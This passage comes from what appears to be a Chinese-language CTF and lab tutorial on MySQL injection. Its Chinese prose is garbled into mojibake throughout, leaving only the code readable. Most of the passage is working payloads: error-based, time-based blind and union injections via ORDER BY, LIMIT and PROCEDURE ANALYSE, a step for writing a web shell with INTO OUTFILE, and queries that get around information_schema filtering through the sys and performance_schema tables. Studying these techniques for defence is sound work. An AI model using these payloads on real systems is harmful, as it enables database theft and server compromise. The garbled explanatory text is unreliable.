class="hljs-operator">%</span>c2æ˜¯Latin1å­—ç¬¦é›†ä¸å­˜åœ¨çš„å­—ç¬¦ï¼Œ<span class="hljs-operator">%</span><span class="hljs-number">00</span><span class="hljs-operator">-</span><span class="hljs-operator">%</span><span class="hljs-number">7</span>Få¯ä»¥ç›´æ¥è¡¨ç¤ºæŸä¸ªå­—ç¬¦ã€<span class="hljs-operator">%</span>C2<span class="hljs-operator">-</span><span class="hljs-operator">%</span>F4ä¸å¯ä»¥ç›´æ¥è¡¨ç¤ºæŸä¸ªå­—ç¬¦è€Œåªæ˜¯å…¶ä»–é•¿å­—èŠ‚ç¼–ç ç»“æœçš„é¦–å­—èŠ‚ã€‚å¯¹äºä¸å®Œæ•´çš„é•¿å­—èŠ‚UTF<span class="hljs-number">-8</span>ç¼–ç çš„å­—ç¬¦ï¼Œè¿›è¡Œå­—ç¬¦é›†è½¬æ¢æ—¶ä¼šç›´æ¥å¿½ç•¥ï¼Œæ‰€ä»¥admin<span class="hljs-operator">%</span>c2ä¼šå˜æˆadmin<br></code></pre></td></tr></table></figure><h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><ul><li><p>åœ¨è°ƒç”¨ <strong>mysql_real_escape_string()</strong> å‡½æ•°ä¹‹å‰ï¼Œå…ˆè®¾ç½®è¿æ¥æ‰€ä½¿ç”¨çš„å­—ç¬¦é›†ä¸ºGBK ï¼Œ<strong>mysql_set_charset&#x3D;(â€˜gbkâ€™,$conn)</strong> ã€‚</p></li><li><p>æ‰€ä»¥é˜²æ­¢å®½å­—èŠ‚æ³¨å…¥çš„å¦ä¸€ä¸ªæ–¹æ³•å°±æ˜¯å°† <strong>character_set_client</strong> è®¾ç½®ä¸ºbinary(äºŒè¿›åˆ¶)ã€‚éœ€è¦åœ¨æ‰€æœ‰çš„sqlè¯­å¥å‰æŒ‡å®šè¿æ¥çš„å½¢å¼æ˜¯binaryäºŒè¿›åˆ¶ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); <br></code></pre></td></tr></table></figure><blockquote><p>å½“æˆ‘ä»¬çš„MySQLæ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚æ•°æ®åï¼Œä¼šè®¤ä¸ºä»–çš„ç¼–ç æ˜¯character_set_clientæ‰€å¯¹åº”çš„ç¼–ç ï¼Œä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶ã€‚ç„¶åå†å°†å®ƒè½¬æ¢æˆcharacter_set_connectionæ‰€å¯¹åº”çš„ç¼–ç ã€‚ç„¶åè¿›å…¥å…·ä½“è¡¨å’Œå­—æ®µåï¼Œå†è½¬æ¢æˆå­—æ®µå¯¹åº”çš„ç¼–ç ã€‚å½“æŸ¥è¯¢ç»“æœäº§ç”Ÿåï¼Œä¼šä»è¡¨å’Œå­—æ®µçš„ç¼–ç è½¬æ¢æˆcharacter_set_resultsæ‰€å¯¹åº”çš„ç¼–ç ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬å°†character_set_clientç¼–ç è®¾ç½®æˆäº†binaryï¼Œå°±ä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥çš„é—®é¢˜äº†ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼ä¼ é€’ã€‚</p></blockquote></li></ul><h2 id="çº¦æŸæ”»å‡»"><a href="#çº¦æŸæ”»å‡»" class="headerlink" title="çº¦æŸæ”»å‡»"></a>çº¦æŸæ”»å‡»</h2><p>å½“æ•°æ®åº“å­—ç¬¦ä¸²é•¿åº¦è¿‡çŸ­ï¼Œå¹¶ä¸”åç«¯æ²¡æœ‰å¯¹å­—ç¬¦ä¸²è¿›è¡Œé•¿åº¦é™åˆ¶æ—¶</p><p>select è¯­å¥å¯¹äºå‚æ•°åé¢ç©ºæ ¼çš„å¤„ç†æ˜¯åˆ é™¤ï¼Œinsertåªæ˜¯æˆªå–æœ€å¤§é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œç„¶åæ’å…¥æ•°æ®åº“ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users(<br>username <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>),<br>  password <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>)<br>)<br></code></pre></td></tr></table></figure><p>æœ€å¤§é•¿åº¦é™åˆ¶(å…·ä½“çœ‹è¡¨çš„å®šä¹‰)ä¸º25 æˆ‘ä»¬è¾“å…¥ç”¨æˆ·åä¸º admin[20ä¸ªç©ºæ ¼]1,å¯†ç éšæ„ã€‚è„šæœ¬æŸ¥è¯¢çš„æ—¶å€™å› ä¸ºç”¨äº†select è¯­å¥ï¼Œç©ºæ ¼è¢«åˆ é™¤ï¼Œå‰©ä¸‹äº†admin1ã€‚</p><p>æ³¨å†Œæ—¶ï¼šINSERTå–å‰25ä½-&gt;admin[20ä¸ªç©ºæ ¼]å’Œè‡ªå·±è®¾å®šçš„å¯†ç å½“æˆäº†ä¸€ä¸ªæ–°ç”¨æˆ·-&gt;selectæŸ¥æ‰¾adminï¼Œè¿”å›ä¸¤æ¡</p><blockquote><p>æ•°æ®åº“é‡Œé¢çš„ç©ºæ ¼ä¹Ÿåœ¨æŸ¥è¯¢çš„æ—¶å€™è¢«åˆ é™¤äº†å†æ¯”è¾ƒ</p></blockquote><h2 id="order-by-åçš„æ³¨å…¥"><a href="#order-by-åçš„æ³¨å…¥" class="headerlink" title="order by åçš„æ³¨å…¥"></a>order by åçš„æ³¨å…¥</h2><h3 id="order-byå‚æ•°åæ³¨å…¥"><a href="#order-byå‚æ•°åæ³¨å…¥" class="headerlink" title="order byå‚æ•°åæ³¨å…¥"></a>order byå‚æ•°åæ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sort&#x27;</span>];  <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>sortå¯ä»¥æ˜¯sqlè¯­å¥ï¼Œåªè¦ä¿è¯è¿”å›ä¸€è¡Œä¸€åˆ—æˆ–è€…æ˜¯ä¸€ä¸ªæ•°å­—æˆ–å¸ƒå°”ç±»å‹ä¹Ÿå¯ä»¥,ä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸‰ç§</p><ul><li><p>ç›´æ¥æ³¨å…¥è¯­å¥ï¼ˆè¦è¿”å›å•è¡Œå•åˆ—ï¼‰ ?sort&#x3D;(select â€¦â€¦)</p></li><li><p>åˆ©ç”¨å‡½æ•°rand ?sort&#x3D;rand(sqlè¯­å¥)</p><ul><li>åˆ©ç”¨çš„æ˜¯rand(true)ä¸rand(false)å¯¼è‡´é¢˜ç›®å›æ˜¾ä¸åŒè€Œæ„é€ ç›²æ³¨æ¡ä»¶</li></ul><p>ä¹Ÿå¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))<br></code></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨and ?sort&#x3D;1 and(sqlè¯­å¥)</p><ul><li>è¿™é‡Œçš„sqlè¯­å¥å¯ä»¥ç”¨å»¶æ—¶æ³¨å…¥</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> If(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">116</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))<br></code></pre></td></tr></table></figure></li></ul><h3 id="procedure-analyse-å‚æ•°åæ³¨å…¥"><a href="#procedure-analyse-å‚æ•°åæ³¨å…¥" class="headerlink" title="procedure analyse å‚æ•°åæ³¨å…¥"></a>procedure analyse å‚æ•°åæ³¨å…¥</h3><p>æ­¤æ–¹æ³•é€‚ç”¨äºMySQL 5.xä¸­ï¼Œåœ¨limitè¯­å¥åé¢çš„æ³¨å…¥ åˆ©ç”¨procedure analyse å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡ŒæŠ¥é”™æ³¨å…¥ã€‚</p><p>åŒæ—¶ï¼Œåœ¨procedure analyse å’Œorder by ä¹‹é—´å¯ä»¥å­˜åœ¨limit å‚æ•°ï¼Œæˆ‘ä»¬åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¾€å¾€ä¹Ÿå¯èƒ½ä¼šå­˜åœ¨limit åçš„æ³¨å…¥ï¼Œå¯ä»¥åˆ©ç”¨procedure analyse è¿›è¡Œæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-46</span><span class="hljs-operator">/</span>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>  <span class="hljs-keyword">procedure</span> analyse(extractvalue(rand(),con<br>cat(<span class="hljs-number">0x3a</span>,version())),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">SELECT</span> field <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,version())),<span class="hljs-number">1</span>); <br># å¦‚æœä¸æ”¯æŒæŠ¥é”™æ³¨å…¥çš„è¯ï¼Œè¿˜å¯ä»¥åŸºäºæ—¶é—´æ³¨å…¥ï¼š<br><span class="hljs-keyword">SELECT</span> field <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span> <span class="hljs-keyword">PROCEDURE</span> analyse((<span class="hljs-keyword">select</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(IF(MID(version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">LIKE</span> <span class="hljs-number">5</span>, BENCHMARK(<span class="hljs-number">5000000</span>,SHA1(<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>))))),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into-outfile-å‚æ•°"><a href="#å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into-outfile-å‚æ•°" class="headerlink" title="å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into outfile å‚æ•°"></a>å¯¼å…¥å¯¼å‡ºæ–‡ä»¶into outfile å‚æ•°</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-46</span><span class="hljs-operator">/</span>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile &quot;c:\\wamp\\www\\sqllib\\test<br>1.txt&quot;<br># å°†æŸ¥è¯¢ç»“æœå¯¼å…¥åˆ°æ–‡ä»¶å½“ä¸­<br># é‚£è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä¸Šä¼ ç½‘é©¬ï¼Œåˆ©ç”¨lines terminated <span class="hljs-keyword">by</span><br><span class="hljs-keyword">Into</span> outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated <span class="hljs-keyword">by</span> <span class="hljs-number">0</span>x(ç½‘é©¬è¿›è¡Œ<span class="hljs-number">16</span> è¿›åˆ¶è½¬<br>æ¢)<br></code></pre></td></tr></table></figure><h2 id="å…­ã€å¸¸è§bypass"><a href="#å…­ã€å¸¸è§bypass" class="headerlink" title="å…­ã€å¸¸è§bypass"></a>å…­ã€å¸¸è§bypass</h2><p><a href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">SQLæ³¨å…¥ç»•è¿‡æŠ€å·§ | ç“¦éƒ½å‰‹ (dropsec.xyz)</a></p><h3 id="Information-schemaè¢«å±è”½æˆ–è¿‡æ»¤oræ—¶"><a href="#Information-schemaè¢«å±è”½æˆ–è¿‡æ»¤oræ—¶" class="headerlink" title="Information_schemaè¢«å±è”½æˆ–è¿‡æ»¤oræ—¶"></a>Information_schemaè¢«å±è”½æˆ–è¿‡æ»¤oræ—¶</h3><p><a href="https://www.anquanke.com/post/id/193512">èŠä¸€èŠbypass information_schema - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><h4 id="MySQL5-7çš„æ–°ç‰¹æ€§"><a href="#MySQL5-7çš„æ–°ç‰¹æ€§" class="headerlink" title="MySQL5.7çš„æ–°ç‰¹æ€§"></a>MySQL5.7çš„æ–°ç‰¹æ€§</h4><blockquote><p>ç”±äºperformance_schemaè¿‡äºå‘æ‚ï¼Œæ‰€ä»¥mysqlåœ¨5.7ç‰ˆæœ¬ä¸­æ–°å¢äº†sys schemmaï¼ŒåŸºç¡€æ•°æ®æ¥è‡ªäºperformance_chemaå’Œinformation_schemaä¸¤ä¸ªåº“ï¼Œæœ¬èº«æ•°æ®åº“ä¸å­˜å‚¨æ•°æ®ã€‚</p></blockquote><h4 id="innodbè¡¨â€“æŸ¥æ‰¾å½“å‰æ•°æ®åº“çš„ç°å­˜è¡¨"><a href="#innodbè¡¨â€“æŸ¥æ‰¾å½“å‰æ•°æ®åº“çš„ç°å­˜è¡¨" class="headerlink" title="innodbè¡¨â€“æŸ¥æ‰¾å½“å‰æ•°æ®åº“çš„ç°å­˜è¡¨"></a><strong>innodbè¡¨</strong>â€“æŸ¥æ‰¾å½“å‰æ•°æ®åº“çš„ç°å­˜è¡¨</h4><p>MySQL 5.6 åŠä»¥ä¸Šç‰ˆæœ¬å­˜åœ¨innodb_index_statsï¼Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œå…¶ä¸­åŒ…å«æ–°å»ºç«‹çš„åº“å’Œè¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name <span class="hljs-operator">=</span> database(); # è¿”å›å»é‡è¿‡åçš„è¡¨å(ç®€æ´)<br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_index_stats <span class="hljs-keyword">where</span> database_name <span class="hljs-operator">=</span> database(); # è¿”å›å€¼ä¸­ä¼šå‡ºç°é‡å¤çš„è¡¨å<br></code></pre></td></tr></table></figure><h4 id="sysè¡¨"><a href="#sysè¡¨" class="headerlink" title="sysè¡¨"></a>sysè¡¨</h4><p>åœ¨MySQL 5.7.9ä¸­sysä¸­æ–°å¢äº†ä¸€äº›è§†å›¾ï¼Œå¯ä»¥ä»ä¸­è·å–è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql">#åŒ…å«<span class="hljs-keyword">in</span><br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `sys`.`x$innodb_buffer_stats_by_table` <span class="hljs-keyword">where</span> object_schema <span class="hljs-operator">=</span> database();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `sys`.`innodb_buffer_stats_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_index_statistics` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`schema_auto_increment_columns` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> table_schema <span class="hljs-keyword">FROM</span> sys.schema_table_statistics <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_schema;<br>#ä¸åŒ…å«<span class="hljs-keyword">in</span><br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_flattened_keys` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$ps_schema_table_statistics_io` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_table_statistics_with_buffer` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> table_schema <span class="hljs-keyword">FROM</span> sys.x$schema_flattened_keys <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_schema;<br>#é€šè¿‡è¡¨æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„è·å–è¡¨å<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`io_global_by_file_by_bytes` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`io_global_by_file_by_latency` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`x$io_global_by_file_by_bytes` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><br>#æŸ¥è¯¢æŒ‡å®šåº“çš„è¡¨ï¼ˆè‹¥æ— åˆ™è¯´æ˜æ­¤è¡¨ä»æœªè¢«è®¿é—®ï¼‰<br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> sys.schema_table_statistics <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mspwd&#x27;</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_name;<br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> sys.x$schema_flattened_keys <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mspwd&#x27;</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_name;<br>#ç»Ÿè®¡æ‰€æœ‰è®¿é—®è¿‡çš„è¡¨æ¬¡æ•°:åº“å,è¡¨å,è®¿é—®æ¬¡æ•°<br><span class="hljs-keyword">select</span> table_schema,table_name,<span class="hljs-built_in">sum</span>(io_read_requests<span class="hljs-operator">+</span>io_write_requests) io <span class="hljs-keyword">from</span> sys.schema_table_statistics <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><br>table_schema,table_name <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> io <span class="hljs-keyword">desc</span>;<br>#æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿æ¥çš„ç”¨æˆ·è¯¦ç»†ä¿¡æ¯<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>,db,command,current_statement,last_statement,<span class="hljs-type">time</span> <span class="hljs-keyword">FROM</span> sys.session;<br>#æŸ¥çœ‹æ‰€æœ‰æ›¾è¿æ¥æ•°æ®åº“çš„IP,æ€»è¿æ¥æ¬¡æ•°<br><span class="hljs-keyword">SELECT</span> host,total_connections <span class="hljs-keyword">FROM</span> sys.host_summary;<br># åŒ…å«ä¹‹å‰æŸ¥è¯¢è®°å½•çš„è¡¨<br><span class="hljs-keyword">SELECT</span> QUERY <span class="hljs-keyword">FROM</span> sys.x$statement_analysis <span class="hljs-keyword">WHERE</span> QUERY REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> QUERY <span class="hljs-keyword">FROM</span> `sys`.`statement_analysis` <span class="hljs-keyword">where</span> QUERY REGEXP DATABASE();<br></code></pre></td></tr></table></figure><h4 id="performance-schemaè¡¨"><a href="#performance-schemaè¡¨" class="headerlink" title="performance_schemaè¡¨"></a>performance_schemaè¡¨</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_handles` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br>#åŒ…å«ä¹‹å‰æŸ¥è¯¢è®°å½•çš„è¡¨<br><span class="hljs-keyword">SELECT</span> digest_text <span class="hljs-keyword">FROM</span> `performance_schema`.`events_statements_summary_by_digest` <span class="hljs-keyword">WHERE</span> digest_text REGEXP DATABASE();<br>#åŒ…å«è¡¨æ–‡ä»¶è·¯å¾„çš„è¡¨<br><span class="hljs-keyword">SELECT</span> file_name <span class="hljs-keyword">FROM</span> `performance_schema`.`file_instances` <span class="hljs-keyword">WHERE</span> file_name REGEXP DATABASE();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232923.jpg" alt="image-20220707221836224"></p><blockquote><p>ä¸Šè¯‰è¡¨æ ¼ä¸­è™½ç„¶æœ‰èƒ½å¤ŸæŸ¥åˆ—åçš„è¡¨ï¼Œä½†æ˜¯æŸ¥å‡ºæ¥çš„æ•°æ®éƒ½ä¸å…¨ï¼Œå½“çŸ¥é“flagæ‰€åœ¨çš„åº“å’Œè¡¨åæ—¶ï¼Œä½†æ— æ³•è·å–åˆ°åˆ—åï¼Œå°±éœ€è¦åˆ©ç”¨æ— åˆ—åç›²æ³¨äº†</p></blockquote><h4 id="joinæ— åˆ—åæ³¨å…¥-payload"><a href="#joinæ— åˆ—åæ³¨å…¥-payload" class="headerlink" title="joinæ— åˆ—åæ³¨å…¥ payload"></a>joinæ— åˆ—åæ³¨å…¥ payload</h4><p><strong>join â€¦ using(xx)</strong></p><p>æŸ¥è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span> sys.schema_auto_increment_columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span> sys.schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><blockquote><p>Union all ä¸union çš„åŒºåˆ«æ˜¯å¢åŠ äº†å»é‡çš„åŠŸèƒ½</p></blockquote><p>æŸ¥åˆ—å(é€‚ç”¨äºé€—å·è¢«è¿‡æ»¤)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> é‡å‘½åæ³•<br><span class="hljs-keyword">select</span> c <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> a, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> b, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">1</span>;<br>#æ— é€—å·ï¼Œæœ‰<span class="hljs-keyword">join</span>ç‰ˆæœ¬<br><span class="hljs-keyword">select</span> a <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> `a`)m <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span> `b`)n <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span> `c`)t <span class="hljs-keyword">where</span> <span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x;<br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span 